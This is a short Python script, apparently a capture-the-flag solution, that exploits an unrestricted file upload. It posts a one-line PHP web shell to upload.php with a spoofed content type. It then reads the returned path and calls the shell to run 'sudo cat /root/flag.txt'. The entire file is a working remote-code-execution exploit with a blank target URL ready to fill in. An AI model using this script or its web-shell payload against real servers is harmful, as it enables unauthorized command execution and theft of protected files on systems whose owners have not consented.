import requests

# Target upload URL (change port if needed)
url = ""

uploadUrl = url+"upload.php"

paylaod = '<?=`$_GET[0]`?>'

file = {
    'fileToUpload' : ("exp.php",paylaod,"xapplication/x-php")
}
data = {
    'submit' : 'Upload'
}

response = requests.post(uploadUrl, files=file, data=data)
path = response.text
apth = path.find("Path: ") + len("Path: ")
filePath = path[apth:].strip()
Malreq = url+filePath+"?0=sudo cat /root/flag.txt"
response = requests.get(Malreq)
print(response.text)
